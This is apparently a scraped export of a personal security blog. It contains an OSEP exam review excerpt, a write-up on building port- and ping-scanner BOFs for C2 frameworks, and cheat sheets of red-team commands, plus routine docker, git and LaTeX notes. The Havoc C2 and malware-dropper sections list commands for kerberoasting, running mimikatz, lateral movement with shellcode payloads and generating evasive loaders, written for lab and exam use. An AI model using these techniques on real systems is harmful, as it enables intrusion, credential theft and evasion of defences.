(VPN, VM, Computer, Proctoring tool, etc). Just message them in the chat explaining what happened (ie. poor software and/or hardware, shit crashes). They’re usually pretty ok with it. Just restart, reshare and explain what happened.\nIf the proctor is not responding then contact them via this chat. When I had issue and my proctor wasn’t responding for like 1 hour and I needed them to unfreeze the webcam/VPN, I messaged them here and someone answered pretty much straight away and nudged the proctor to respond to me and fix my environment.\nThe dev Windows VM They give you a Windows virtual machine that is configured with all the tools required for writing and compiling c sharp, office macros, etc. Machine has Defender disabled, all the tools you need and has quite a lot of hardware resources.\nIt’s probably the fastest machine in the environment… I recommend to make use of it unless you run your own Windows VM where you can do those kind of things easily. Credentials are on the internal exam control panel.\nThe Exam Report You have 24 hours to finalise and send your report after the exam ends. Make sure you follow the instructions on how to send your report properly (ie. 7z without password, submit on that portal, etc).\nIf you took notes and a lot of screenshots during the exam, this should be a breeze and the formatting should be the most time consuming part.\nI personally used the following offsec exam markdown report template which has some nice report layouts and allows you to take notes in Markdown and generate the final PDF report directly without having to touch MS Word.\nWarning\nWhen installing the Eisvogel latex template with that Offsec Markdown template, don’t use the v2.5 of the Eisvogel latex template because its bugged for images and will not resize/center them properly.\nRef: https://github.com/Wandmalfarbe/pandoc-latex-template/issues/405 Ref2: https://github.com/noraj/OSCP-Exam-Report-Template-Markdown/issues/63\nIf you decide to use that tool, be wary that you may need some bash magic to convert links and other things that might break during conversion. You can look at the Github issues on the repo to look for help but if you’re not confident you can fix the formatting yourself quickly then I wouldn’t recommend it and suggest using the Offsec Word Document instead.\nOnce you’ve submitted the report, you can finally start cleaning up, respond to everyone you ghosted over the past few days and get back to scrolling twitter and watching anime while you wait for Offsec’s email response.\nFamous last words One thing that always amazes me in these long exams is that you can get an insane amount of stuff done, learned and researched in just 48 hours when you disregard all other life distractions and become a hermit.\nProbably not good in the long term but interesting food for thought…\nGood Luck Comrade! "},"title":"OffSec Experienced Penetration Tester (OSEP) Exam Review"},"/articles/replicating-cobalt-strikes-port-scanner-as-a-bof-for-open-source-c2-frameworks/":{"data":{"":"","#":" Tldr\nWas annoyed open source C2 tools had inferior port scanners compared to Cobalt Strike so I decided to replicate the functionality. Also wrote a ping scanner to help with host discovery. OPSEC may still require some improvements as described throughout the blog but the functionality is there. The tool is available here: https://github.com/fyxme/portscanbof\nOn my quest to reviewing random C2’s for pure self enjoyment, I’ve come to realise that very few implement port-scanning for whatever reason.\nWhile I understand that it’s possible to use a socks proxy and perform nmap scans over the proxy using a TCP connect scan (-sT flag), it feels less convenient, generates a lot of unwanted network traffic, requires the beacon to communicate constantly (sleep 0) and may have DNS issues, which made me want to re-create the Cobalt Strike Port Scan functionality.\nIt’s already possible to run binaries (ie. exe and dll) via other BOFs like noconsolation, using dotnet CLR to run csharp binaries inline or using a PowerShell port scanner via the C2’s powershell functionality, however, a lot of these generate more IoCs than BOFs and their output formats don’t integrate as well with C2’s since they were not directly made for those.\nThrough reviewing a number of BOFs on Github, looking at custom C2 agents and more, I didn’t find many implementing portscanning up to the level of Cobalt Strike’s Port Scanner. Although, I will give the following honourable mentions:\nrvrsh3ll’s bofportscan BOF which works well but only supports a single host and a single port Mythic’s thanatos agent which seemed to be the most complete, supports IP and IP subnets as well as ports and port ranges. While the agent itself is really good and the blog post about it deserves a read, this port scan functionality is only available to users of this specific agent, isn’t portable like a BOF, and still doesn’t support as many arguments or output as Cobalt Strike’s port scanner. Hence, the goals were set:\nwrite a portscanner BOF (COFF) that replicates Cobalt Strikes Port Scanning functionality including the wide variety of input parameters and provide the same amount of information as its output write a pingscanner to complement the portscanner and use as a first pass scan have some OPSEC considerations or at least describe the OPSEC limitations of the tool. The initial release will be used to test and improve the BOF in training environments and/or test labs, with future improvement adding functionality and improving OPSEC. We’ll write the BOF in C as it’s the most common language to use for BOFs.\nEnough intro, let’s begin.\nParsing Arguments Cobalt Strike’s port scanner can be using the following way:\nportscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] The [pid] and [arch] options are used to “inject into the specified process to run a port scan against the specified hosts”. We’ll ignore completely as our BOF will just execute within the context of the running agent. Nevertheless, this is a good functionality if you want to improve OPSEC as you may want to choose a process which is likely to perform arbitrary requests to other hosts (eg. a web browser for HTTP/HTTPS). The [targets] option is a comma separated list of hosts to scan. You may also specify IPv4 address ranges (e.g., 192.168.1.128-192.168.2.240, 192.168.1.0/24) The [ports] option is a comma separated list or ports to scan. You may specify port ranges as well (e.g., 1-65535) The [arp|icmp|none] target discovery options dictate how the port scanning tool will determine if a host is alive. none assumes that all hosts are alive. Instead of doing this in the port scan BOF itself, I’ve decided to implement the icmp functionality in a different BOF (ie. pingscan) which will be described later on. The arp scan feature will be implemented as a feature update in a future release. For our portscan, we’ll just assume that all hosts are alive (ie. none) and use timeouts instead to reduce the time it takes to perform a portscan. Lastly, the [max connections] option limits how many connections the port scan tool will attempt at any one time. While this is not hard to code, performing synchronous scans is actually already really fast if you set low enough timeouts (which should be fine considering you’d expect low RTT in most internal environments). Nevertheless, this is a good feature that will be added in a future release. We’ll split our BOF between portscan (ie. TCP connect scan) and pingscan (ie. ICMP echo/reply) with each being used the following way:\nportscan [targets] [ports] pingscan [targets] Parsing ports Parsing ports is relatively easy, there’s only three (3) options:\na single port (eg. 22,445,80, etc) a port range (eg. 1-100, 5000-6000, etc) an arbitrary combination of the two above options separated by a comma (eg. 22,5000-9000,445,7) To improve user experience, we’ll also allow decreasing port ranges (eg. 900-100) for bragging rights on Cobalt Strike’s inferior port scanning argument parser.\nThe pseudo-code for this is simple:\nsplit input on \",\" for each part: if it contains a dash (\"-\") assume its a range: get both parts of the range using sscanf convert each part to an int check that each part is between 1 and 65535 else assume its a port: convert str to int check that the int is between 1 and 65535 Assuming the parts are valid and passed our rudimentary checks, we need to store these ports. A design decision was made to use a linked list to store these as it reduces memory usage when large ranges are provided and easily allows arbitrary combinations to be made. To make things easier, we’ll assume that a single port is the same as the range from that port to itself (ie. \"80\" == \"80-80\"), which allows us to use the following struct:\nParsing targets Parsing targets is a lot more involved since there are many available options, however we can split valid input options between the following input types:\nIP Range: token contains a dash (-). Need to validate that each part of the dash is a valid IP otherwise you might end up matching hosts (eg. asdf-asdf.com). CIDR: that one is easy, just match on /, parse the IP and the mask and do calculations to find the IP range, which brings us back to type 1 Host: you can use getaddrinfo to do the work for you here as it will find IPs for hostnames for you. IP: similarly to hosts, we can use getaddrinfo and validate the IP which allows us to treat single IPs, the same way as single Hosts. A combination of any of the above input types, split by a comma (,) In the end, you can categorise each target into one of two categories:\nIP Range: IP ranges, and CIDR Subnet (ie. an IP range in disguise) IP/Host: Everything else that was parsed correctly by getaddrinfo Similarly to port arguments, we’ll use a linked list to store the information as it provides the most flexibility. This results in the following struct definitions:\nImportant\nOPSEC: The getaddrinfo function returns results for the NS_DNS namespace. The getaddrinfo function aggregates all responses if more than one namespace provider returns information. For use with the IPv6 and IPv4 protocol, name resolution can be by the Domain Name System (DNS), a local hosts file, or by other naming mechanisms for the NS_DNS namespace. (ref)\nie. getaddrinfo will resolve host names to their IPs. This potentially results in network traffic being generating while parsing input. To limit network traffic, we store a pointer to the addrinfo struct populated after running getaddrinfo and we’ll reuse it during scanning operations.\nCorrect parsing results in the following (with reversible IP ranges to assert dominance on Cobalt Strike’s inferior parser):\nICMP (ping scan) Windows API provides a very easy to use function to send ICMP echo requests, namely IcmpSendEcho. We can use this function to send ICMP echoes to our targets easily:\n// The **IcmpSendEcho** function sends an IPv4 ICMP echo request and returns any echo response replies. The call returns when the time-out has expired or the reply buffer is filled. IPHLPAPI_DLL_LINKAGE DWORD IcmpSendEcho( [in] HANDLE IcmpHandle, [in] IPAddr DestinationAddress, [in] LPVOID RequestData, [in] WORD RequestSize, [in, optional] PIP_OPTION_INFORMATION RequestOptions, [out] LPVOID ReplyBuffer, [in] DWORD ReplySize, [in] DWORD Timeout ); The function takes in a HANDLE IcmpHandle as its first parameter which denotes a handle returned by the IcmpCreateFile function (ie. a “function which opens a handle on which IPv4 ICMP echo requests can be issued.”). From testing, it appears we can reuse this file allowing us to create the initial handle and reuse it on subsequent calls to IcmpSendEcho resulting in improved scanning speed.\nOPSEC I wanted to see the network traffic difference between the IcmpSendEcho default configuration and the traffic generated from the ping.exe Windows utility. As it turns out, there is quite a bit of a difference:\nWe notice the following from the screenshot above:\nping.exe: the ICMP requests and replies from the first four packets (those generated by the ping utility) are all 74 bytes long. The packet’s time to live (ie. ttl) is set to 128ms. IcmpSendEcho: the request packets are 46 bytes long and the reply packets are 60 bytes long. The packet’s TTL defaults to 255ms. By comparing the requests packets, we notice that the ping utility sends data as part of the request, namely the following string abcdefghijklmnopqrstuvwabdcefghi.\nWe can match this in our function call by passing in RequestData, and adjust the packet’s TTL to 128ms. This results in the following traffic being generated which is now identical between both ping.exe and our ping scanner:\nNote\nThe ping reply size difference was simply due to the difference in data being sent (since the reply contains the data our packet has sent), hence no further configuration was needed.\nWith configurations and optimisations via timeout, this results in the following code:\nDanger\nOPSEC: Other than the improvements described above, the tool does not currently add any delay between ping requests which can result in extremely fast consecutive requests being made which could lead to Denial of Service (DoS) on fragile hosts/environments if you’re not careful. Further customisation options will added in a future release to help improve OPSEC, as well as the ability to configure a custom timeout. The defaults will be adjusted to ping.exe’s timeouts.\nWe can combine this with the parser to have a working pingscanner that supports many input types:\nSpeed Surprisingly if you don’t add a delay between the ping requests, it’s actually extremely fast… Who knew…\nWithout multi-threading or any other optimisations, running it against a /24 subnet (ie. 255 IPs) with low response times, you can scan the whole subnet in about 4 seconds: Just watch out… If you ping scan too quickly, you get angry neighbours… From ~20ms to over 10 times that for each ping:\nFrom testing, it appears there are two events which can slow down the ping scan:\nA ping request timeout which results in error 11010 aka IP_REQ_TIMED_OUT. This is possible to optimise by setting the request timeout in IcmpSendEcho, although there is a trade-off where you may end up with false negatives (ie. the host exists but took longer than timeout time to respond). Supplying non existant domains will result in delay from getaddrinfo. Unfortunately, it doesn’t have a timeout so you’d need to run it in a thread and time it out yourself if you wanted to optimise this. Or implement DNS requests yourself, but I’ll leave that as an exercise for the reader. Furthermore, getaddrinfo is also extremely slow when provided with invalid input… A stunning 2.4s to say that the host doesn’t exist: The simplest fix to the above would be to check whether the input is a valid IP or hostname based on a regex, although this is harder than expected because in an internal environment, pretty much anything could be a valid hostname….\nOPSEC wise performing a scan this fast really isn’t great and will start flooding the network with too many packets, potentially generating alerts or breaking stuff. But damn it’s fun to see the packets go by at MACH 2 speed!\nI’ll add IP/Host validation as an optimisation in the backlog, move on to another project and never implement it. But at least you know its there… So yeah, don’t pass stupid data to it and you should be sweet!\nTCP (port scan) Before attempting to write a port scanner, I looked at the video linked on Cobalt Strike’s website about the Port Scanning functionality. From this, I gathered a few things I wanted to include in this port scanner:\nThe port scanner shows all open ports (that’s an obvious one) For each port/service it finds, if the service supplies a banner (ie. SSH), then it will receive the banner and display it The scanner provides additional information for Windows hosts with SMB open (port 445) This is the functionality I wanted to replicate with this BOF.\nPort Scan Function Note\nThis is describing a TCP Connect Scan. If you are interested in other types of scans, checkout nmap’s book on scan methods.\nPort scanning in itself is very simple, you have an IP and a port, you connect to an address, if the socket connects successfully, that port is open, if the socket errors that port is closed. Translate to code, this looks something like this (assuming WSA is initialised outside of this function):\nNot much going on here but this would also make a terrible port scanner because it would be terribly slow when you try to scan a port/service that doesn’t exist (ie. you’d get timed out but it would take a while). The screenshot below demonstrates this. It’s pretty much instant when the service exists (Elapsed time: 0.00 seconds) but takes forever when the services do not respond (Elapsed time: 42.00 seconds):\nTo improve the speed we can set a timeout when the socket attempts to connect to the remote port/service. On Windows, this results to setting the socket to non-blocking mode and using the select function to wait for the socket to successfully connect or timeout. This allows us to set a socket timeout and greatly increase the speed of the program:\nThe code above results in an increase of 41 seconds over the old code:\nLastly, since we want to receive the headers from sockets we successfully connect to, we should set a timeout on the socket receive too. We can do this using the setsocketopt function prior to connecting to the socket as such:\nThis is pretty much it in terms of basic setup and allows us to identify open ports at a reasonable speed. We can now move on to more fun stuff like receive service headers and querying Windows Host information.\nService Headers and Information Discovery In the video posted on the Cobalt Strike website, they show banner information retrieved when port scanning:\nNow, the simple headers like SSH are simply sent upon connecting to the service. You just need to receive after connecting to the socket. You don’t even need to send any data:\nThis is trivial to add to our scanner using the following snippet:\nNote: In the above snippet, we are setting the socket back to blocking mode, however if we wanted to keep it asynchronous we could use a similar approach as what we did for connect, check the WSA Error and use select to wait for the recv function to end or timeout.\nI knew you could get computer information from SMB such as hostname and domain but I’ve never had to implement it in code so I wasn’t sure where to get it from. The computer information seemed harder to get from SMB and I thought surely you wouldn’t get that from simply connecting to the socket. Spoiler alert, you don’t…\nSo I went down the rabbit hole and found some documentation on how to get server information on MS Documentation. I started by using NetServerGetInfo to try and retrieve the same information as in the cobalt strike clip… Turns out it was not that…. I didn’t get much information from it but was on the right track:\nDid more digging and found another more promising function, namely NetWkstaGetInfo. And as it turns out, it looks like this is what they are using under the hood. I was able to get the exact same information as Cobalt Strike’s port scanner from that one function call:\nNote\nYou can request different levels of information from both NetWkstaGetInfo and NetServerGetInfo.\nExample for NetWkstaGetInfo:\nAnonymous access is always permitted for level 100. Authenticated users can view additional information at level 101 Members of the Administrators, and the Server, System and Print Operator local groups can view information at levels 102. We’re using level 100 here since we want to do this unauthenticated.\nAll that remained was adding the following code to our scanner:\nFinal Scanner After implementing all of the above, we have a scanner that can identify open ports, prints Windows host information and displays service banners:\nHowever, it’s not a BOF yet…\nOPSEC At the moment the tool scans all selected ports on one (1) IP before moving on to the next, however it might be better to do the opposite and scan one (1) port on all IPs and move on to the next port.\nAn even better solution might be to randomly choose 1 port and 1 IP and scan that, although if you see random ports and IPs popping up in logs than it also might stand out as weird… More research required.\nInterestingly, looking at the output from Cobalt Strike’s video demonstrating their port scanner, I noticed two things:\nThey are scanning IPs and ports from highest to lowest (probably due to how they are parsing the arguments). You can see the first service to come back is port 5357 on 10.10.10.2222: And after the video cut, you can see the IPs are decreasing and ports too:\nThey perform the NetWkstaGetInfo on all hosts with port 445 open at the end of the scan, which is why you see all of the port 445 hosts popup at once: No idea if their design is better or not. Need to test it inside a lab environment where monitoring tools are in place to gain a better idea. Good follow up research!\nConverting to a BOF A follow up blog will be released highlighting how the scanners were converted to BOFs and will cover the following topics:\nDynamic Resolution of Win32 APIs and generating function declaration mappings automatically Compiling larger BOFs with multiple c files Improved BOF output through batching prints In the meantime, you can enjoy using the tool by downloading it from github: https://github.com/fyxme/portscanbof\nInitial release After converting the application to a BOF and cleaning up the output, we get the following:\nThe code and usage guide has been released publicly and can be found here: https://github.com/fyxme/portscanbof\nThe tool may have been update since this blog was written. See the corresponding GitHub repository for up to date information.\nFuture improvements Add async/multi-threading support for TCP scan - This has been added since this blog was written. Still need to do more testing but good for now ARP scan Add the ability to check if the host is alive before running a TCP scan (similar to how cobaltstrike does it) Additional arguments including timeout, number of threads, only scan 1 ip per host, etc Add sleep delay option between ICMP requests to prevent DOS and improve OPSEC (approx 1 second delay from ping.exe) Fix code and Makefile for compiling exe’s code refactor, and ensure all failure checks are validated (ie. memory allocation failures, etc) UDP scan IPV6 Support Linux support References https://gist.github.com/dascandy/544acdfdc907051bcaa0b51d6d4a334a https://github.com/rvrsh3ll/BOF_Collection/blob/master/Network/PortScan/PortScan.c https://github.com/tijme/amd-ryzen-master-driver-v17-exploit https://trustedsec.com/blog/bofs-for-script-kiddies https://blog.cybershenanigans.space/posts/thanatos-agent https://blog.cybershenanigans.space/posts/writing-bofs-without-dfr/ https://www.elastic.co/security-labs/detonating-beacons-to-illuminate-detection-gaps https://beej.us/guide/bgnet/html/split/ https://tangentsoft.com/wskfaq/ https://blog.cybershenanigans.space/posts/writing-bofs-without-dfr/#intro https://github.com/rvrsh3ll/BOF_Collection/blob/master/Network/PortScan/portscan.cna https://github.com/wsummerhill/C2_RedTeam_CheatSheets/blob/main/CobaltStrike/BOF_Collections.md https://github.com/phra/PEzor/blob/b4e5927775de49735e22dc4b352b7e45d750cb15/bof.cpp#L151 https://frn.sh/posts/sockets/ "},"title":"Replicating Cobalt Strike's Port Scanner BOF for Open-Source C2 | Fast OPSEC-Aware Ping \u0026 TCP Connect Scanning in C"},"/bazaar/":{"data":{"":" Warning\nThe bazaar is at a very early stage. Anything and everything may change for better or worse.\nA bazaar or souk is a marketplace consisting of multiple small stalls or shops, especially in the Middle East, the Balkans, Central Asia, North Africa and South Asia. They are traditionally located in vaulted or covered streets that have doors on each end and served as a city’s central marketplace.\nIn other terms, the cyber bazaar is a place for structured chaos where you can (sometimes) find cyber things you need (and sometimes stuff you don’t need).\nA wiki / cheatsheet combination of some sorts with some magic dust sprinkled in there.\nImportant\nThe goal is to have quick references to various tools and knowledge that is helpful for cybersecurity, speedrunning ctfs/boot2root/certs and other useful programming knowledge.\nA lot of the techniques described here are very noisy and might not be OPSEC safe. Tread with caution and do your own research if you want to utilise some of the techniques during pentesting or red teaming engagements.","faq#FAQ":"Will I find everything I need here? No\nAt what stage of completion is this? Eternal work in progress\nWhy make yet another cybersecurity cheatsheet? I like the stock\nWhere did you get the image? Yonked it at gunpoint from an AI on the internet.\n“I’ve seen this before, you yonked it from X…” X borrowed from Y who borrowed it from Z who asked an LLM to generate the code for him.\nThe references try to highlight where the code or information was found. If references are missing, feel free to contact me and I will be happy to update them."},"title":"bazaar"},"/bazaar/c2-and-red-team-tools/":{"data":{"":"","#":" Tbd\nPivoting does your ticket have network permissions? sometimes easier to use ptt to pass the ticket or steal a token from the machine that has network privilege on behalf of the machine "},"title":"_index"},"/bazaar/c2-and-red-team-tools/havoc/":{"data":{"":"","#":" Note\nC5Spider (the Author) is currently doing a re-write of Havoc which will most likely improve it’s capabilities and stability. See the havoc repo’s rewrite branch for more details.\nHavoc is still a new C2 framework and has some limitations, things it cannot do and things that may break. Also the havoc client can be a little resource hungry… During OSEP Exam, my VM crashed a few times because of it or the havoc client process was killed. Also had computer crashes but that is most likely a combination of this and Offsec’s proctoring extension.\nCommands # https://github.com/HavocFramework/Havoc/blob/main/WIKI.MD#commands # ~~~ Non-exhaustive list below ~~~ # fork and run. nice to start a second beacon in case the first one dies or something shellcode spawn x64 /payloads/demon.x64.bin # ADCS adcs_enum # Kerberoasting get-spns kerberoast \u003cspn\u003e # run PE inline (exe) - builtin to Havoc - https://github.com/fortra/No-Consolation noconsolation /tools/mimikatz/x64/mimikatz.exe \"klist exit\" # dotnet inline execute dotnet inline-execute \"/tools/SharpCollection/NetFramework_4.7_Any/SharpView.exe\" Find-LocalAdminAccess # Socks Proxy socks add 4242 # dont forget to edit your /etc/proxychains4.conf proxychains4 netexec smb dc01.pinecorp.local -u deamian -p Winter2000 -M gpp_autologin -M gpp_password # port forwarding (usefull to forward a webserver or something) # w/o for firewall settings on the beacon's host rportfwd .... # enum local sessions enumlocalsessions sessions quser schtaskenum netview klist # dir remote share and cat content of file dir \"\\\\dc01.pinecorp.local\\SYSVOL\" cat \"\\\\dc01.pinecorp.local\\SYSVOL\\pinecorp.local/Policies/{EA980932-BE55-11EF-B70F-579199F31135}/Machine/Preferences/Registry/Registry.xml\" # lateral movement # requires LatLoader bof: https://github.com/icyguider/LatLoader # trkwks4185 is the name of your pipe as defined in your SMB listener config LatLoader xorload dev01.pinecorp.local /payloads/smb.x64.bin pivot connect dev01.pinecorp.local trkwks4185 # search for files that end in .psm1 recursively (good to find flag.txt and what not) dir C:\\users /s /b /f /ends .psm1 Modules enumfiles (File search / grep) Tbd\nLatLoader (Lateral Movement) LatLoader | LatLoader is a PoC module to demonstrate automated lateral movement with the Havoc C2 framework. # lateral movement LatLoader xorload dev01.pinecorp.local /payloads/smb.x64.bin # if it doesnt return ExecMethod Succeeded! but writes successfully, the script might need to be realoaded.. script manager \u003e LatLoader \u003e right click \u003e reload # dont forget to connect to host if you used an smb beacon pivot connect dev01.pinecorp.local trkwks4185 Shhhhloader (Obfuscated Dropper) Shhhhloader | Syscall Shellcode Loader Decent obfuscation tool. However, can sometimes break because of obscure havoc profile configurations…\nUse the GUI button in the navbar to generate your payload.\nWarning\nThe tool currently doesn’t support grabbing the payloads from the listeners directly. You have to generate them prior and upload them via the file input in the GUI.\nUAC-BOF-Bonanza (UAC Bypass BOF) UAC-BOF-Bonanza Tbd\nUntested but look interesting\nHighBorn (UAC Bypass BOF) HighBorn Tbd\nUntested but look interesting\nPre-compiled binaries # run PE inline (non C# exe) noconsolation /tools/mimikatz/x64/mimikatz.exe \"klist exit\" # dotnet inline execute (C# exe) dotnet inline-execute \"/tools/SharpCollection/NetFramework_4.7_Any/SharpView.exe\" Find-LocalAdminAccess Dotnet C# binaries:\nhttps://github.com/r3motecontrol/Ghostpack-CompiledBinaries https://github.com/Flangvik/SharpCollection Havoc Profiles Warning\nI’ve had issues with listeners not working properly and not binding correctly. I recommend adding the listeners to your profile directly and if you have to modify or update one, do it from the profile config file and restart the server. (You will not loose your data… but beacons might die if you change the communication protocols, ports etc…)\npython3 havoc_profile_generator.py Ref: https://github.com/Ghost53574/havoc_profile_generator\nLimitations Havoc doesn’t support import-powershell so you need to do it yourself when running a powershell command:\npowershell import-module C:\\windows\\tasks\\somemodule.ps1; Invoke-ModuleCMD Ref: https://github.com/HavocFramework/Havoc/issues/492#issuecomment-2198213157"},"title":"Havoc"},"/bazaar/c2-and-red-team-tools/malware-droppers/":{"data":{"":"","#":" Important\nUse open source malware droppers when playing in testing environments… You don’t want to burn your own dropper when playing around.\nHooka Can be run in Linux and generate Windows binaries (cross platform compilation) Golang # simplest command ./build/hooka_linux_amd64 -i ~/webserver/smb.x64.bin -o imdone.exe # the more shit you add the buggier it might be... and less likely to run # glhf ./build/hooka_linux_amd64 -i ~/webserver/smb.x64.bin -o imdone.exe --proc explorer.exe _ _ _ _ | | | | ___ ___ | | __ __ _ | | | |_| | / _ \\ / _ \\ | |/ / / _` | | | | _ | | (_) | | (_) | | \u003c | (_| | |_| |_| |_| \\___/ \\___/ |_|\\_\\ \\__,_| (_) [*] Obtaining shellcode from /home/lo/webserver/smb.x64.bin \u003e Shellcode is in raw format [*] Defining evasion techniques... [*] Using suspendedprocess technique to execute shellcode [*] Obfuscating variables and functions... [*] Compiling shellcode loader... \u003e Payload format is set to EXE \u003e go build -o imdone.exe loader.go \u003e 3154432 bytes written to imdone.exe [+] Loader file entropy: 6.9330213473661955 [+] Checksums: \u003e MD5: 6666b187280d31537b083c69631b636c \u003e SHA1: 64ff907b7c9d94564ce5857145dd70d8b4761044 \u003e SHA256: d9b5fc90dcd569ae2f00b7dc7bb1ddeae28e1cacc201628afa7d809061dfe561 [+] Shellcode loader has been successfully generated Invoke-Obfuscation https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide https://github.com/danielbohannon/Invoke-Obfuscation https://x.com/dmcxblue/status/1879176230098157962?t=bhHdazl7dNhn39P3g5jVpw\u0026s=19 References https://github.com/mttaggart/rustyneedle https://github.com/joaoviictorti/RustRedOps "},"title":"Malware Droppers"},"/bazaar/computer-science--programming/":{"data":{"":""},"title":"_index"},"/bazaar/computer-science--programming/ai-tools/":{"data":{"":"","clinehttpsdocsclinebot#\u003ca href=\"https://docs.cline.bot/\"\u003eCline\u003c/a\u003e":"Cline Cline is an AI development assistant which integrates with Microsoft Visual Studio Code. It provides an interface between your IDE and LLMs facilitating code development, increasing productivity and lowering the barrier to entry for new coders. Depending on permissions, Cline can read/write files, execute commands, use your web browser, and expand its capabilities with Model Context Protocol servers.\nWhat Can Cline Do? Cline is your AI assistant that can:\nEdit and create files in your project Run terminal commands Search and analyze your code Help debug and fix issues Automate repetitive tasks Integrate with external tools Usage Start a Task Type your request in the chat Example: “Create a new React component called Header” Provide Context Use @ mentions to add files, folders, or URLs Example: “@file:src/components/App.tsx” Review Changes Cline will show diffs before making changes You can edit or reject changes "},"title":"AI tools"},"/bazaar/computer-science--programming/docker/":{"data":{"":"","#":"Migrating docker volume from one server to another Using docker run + tar (Manual Backup \u0026 Restore)** Stop the container (if running): docker stop \u003ccontainer_name\u003e Create a backup of the volume on the source host: docker run --rm -v \u003cvolume_name\u003e:/volume -v $(pwd):/backup busybox tar czf /backup/\u003cbackup_file\u003e.tar.gz -C /volume ./ This creates a compressed .tar.gz file with all volume data.\nTransfer the backup file to the new host using scp, rsync, or any file transfer method scp \u003cbackup_file\u003e.tar.gz user@new_host:/path/to/backup/ Restore the volume on the destination host: docker volume create \u003cnew_volume_name\u003e docker run --rm -v \u003cnew_volume_name\u003e:/volume -v $(pwd):/backup busybox sh -c \"tar xzf /backup/\u003cbackup_file\u003e.tar.gz -C /volume\" This extracts the backup into a new volume.\nStart your container with the new volume: docker run -v \u003cnew_volume_name\u003e:/path/in/container ... "},"title":"docker"},"/bazaar/computer-science--programming/file-synchronisation/":{"data":{"":"","rsync#Rsync":" # rsync -avPh src dst rsync -avPh example test@10.10.10.10:. # needs to be installed on both local and remote # apt update \u0026\u0026 apt get install rsync #'use -avP' and 'know how a trailing slash changes what rsync does' are basically the two rules that cover 99% of all rsync usage. "},"title":"file synchronisation"},"/bazaar/computer-science--programming/git/":{"data":{"":"","#":"Git signing Get git signing key ID:\n# get keys gpg --list-secret-keys --keyid-format SHORT # key id is the one after rsa4096 rsa4096/XXXXXXXX Setup .gitconfig to sign automatically:\n.gitconfig[user] useConfigOnly = true email = ... signingkey = \u003cXXXXXXXX\u003e [commit] gpgSign = true [tag] gpgSign = true ref: https://git-scm.com/book/ms/v2/Git-Tools-Signing-Your-Work ref: https://withblue.ink/2020/05/17/how-and-why-to-sign-git-commits.html\nGit diff(ing): Generating and Applying code patches # GENERATING # head -1 git format-patch -1 HEAD # head - 3 to head git format-patch HEAD~3..HEAD # generating a single patch across multiple commits git format-patch cc1dde0dd^..6de6d4b06 --stdout \u003e foo.patch # generating diff from tags (can use --stat to only get the number of lines changed) git diff 2.0.0 1.0.0 --stat # generating patches for uncommited changes git diff \u003e my-changes.patch # APPLYING git apply \u003cpatch-file\u003e ref: https://www.geeksforgeeks.org/how-to-generate-and-apply-patches-with-git/\nUsing linux diff command Can also be done from linux diff commands directly:\n# GENERATING # new code has the new changes we want to make as part of the patch diff -ru \u003cold code\u003e \u003cnew code\u003e \u003e mychanges.patch # APPLYING # need to be in the directory in which you want to make the diff changes from patch -i mychanges.patch Encrypted git repos Tbd\nhttps://git-annex.branchable.com/tips/fully_encrypted_git_repositories_with_gcrypt/ Git Convetional Commits See versioning"},"title":"git"},"/bazaar/computer-science--programming/image-modifications/":{"data":{"":"","converting-pdf-to-png#Converting PDF to png":"Using imagemagick:\nconvert example.pdf example.png If you get an error about some PDF policy, make sure you have ghostcript installed (gs --version) and comment out the following line in the /etc/ImageMagick-6/policy.xml file:\n\u003cpolicy domain=\"coder\" rights=\"none\" pattern=\"PDF\" /\u003e "},"title":"Image modifications"},"/bazaar/computer-science--programming/latex/":{"data":{"":"","pandoc#Pandoc":"Installation sudo apt update sudo apt install pandoc Latex to PDF pandoc example.tex -o example.pdf --pdf-engine=pdflatex # xelatex supports more fonts and might give better results. YMMV. pandoc example.tex -o example.pdf --pdf-engine=xelatex # adding metadata pandoc example.tex -o example.pdf \\ --pdf-engine=xelatex \\ --template=my_template.tex \\ # Use a custom template --metadata title=\"My PDF\" \\ # Set document metadata --metadata author=\"fyx(me)\" Ref: https://www.reddit.com/r/LaTeX/comments/cj0j8h/pdflatex_or_xelatex/\nInstalling pdflatex and xelatex engines sudo apt update sudo apt install texlive-latex-base texlive-latex-extra texlive-fonts-recommended texlive-xetex "},"title":"latex"},"/bazaar/computer-science--programming/orchestration-workflows/":{"data":{"":"","#":"Workflow orchestration tldr: A fancy cron runner with advanced workflow management, status monitoring, alerting, etc…\nCyber security use cases:\nMonitoring tasks Scheduled offensive/defensive scan triggers Daily Enumeration workflows data pipelines and more… Prefect Prefect offers modern orchestration solutions to empower data teams to build resilient workflows that scale with versatile resource needs.\nRef: https://www.prefect.io/\nApache Airflow Apache Airflow® is a platform created by the community to programmatically author, schedule and monitor workflows.\nRef: https://airflow.apache.org/\nDifference between CI-CD runners and Workflow orchestrators Difference between CI-CD runners like Github actions and Workflow orchestrators like Airflow and Perfect?\nAs to the differences, GitHub actions is generally a “on commit, do something”, like build an image, run tests, linting, build documentation, etc. It’s a tool generally to automate actions on your repository.\nAirflow and Prefect are orchestration systems. They’re not tied to a repo and can do a wider variety of things. For example, every day at 4am run a daily report for the prior business day. Every weekend retain our ML models by spinning up some Amazon ECS tasks. Every half an hour hit an external API and digest it’s data into our data lake.\n[…] GitHub actions… Can be shoehorned to do orchestration in a limited fashion, but it’s not quite the intent.\nPrefect and airflow are, however, explicitly designed to do it. For Prefect, that means I dictate how things are run (containers, dask workers, other), I can specific what to happen on failure (retry, pagerduty alert, slack warnings, etc), and many other things that in general make my life easier bridging the proof of concept to fully productionised system easier.\nRef: https://www.reddit.com/r/mlops/comments/13ulfux/airflow_vs_github_actions_workflows/"},"title":"orchestration (workflows)"},"/bazaar/computer-science--programming/versioning/":{"data":{"":"","#":"Semver : Semantic versioning ref: https://semver.org/\nGiven a version number MAJOR.MINOR.PATCH, increment the:\nMAJOR version when you make incompatible API changes MINOR version when you add functionality in a backward compatible manner PATCH version when you make backward compatible bug fixes Additional labels for pre-release and build metadata are available as extensions to the MAJOR.MINOR.PATCH format.\nOther ref:\nhttps://www.conventionalcommits.org/en/v1.0.0/ Conventional commits Tldr\nCommit formats: feat(parser): add ability to parse arrays Tags: feat, fix, build, chore, ci, docs, style, refactor, perf, test\nBreaking changes: a footer BREAKING CHANGE:, or appends a ! after the type/scope (eg. fix(parser)!: fixed CVE-XXX by adding input validation)\nThe Conventional Commits specification is a lightweight convention on top of commit messages. It provides an easy set of rules for creating an explicit commit history; which makes it easier to write automated tools on top of. This convention dovetails with SemVer, by describing the features, fixes, and 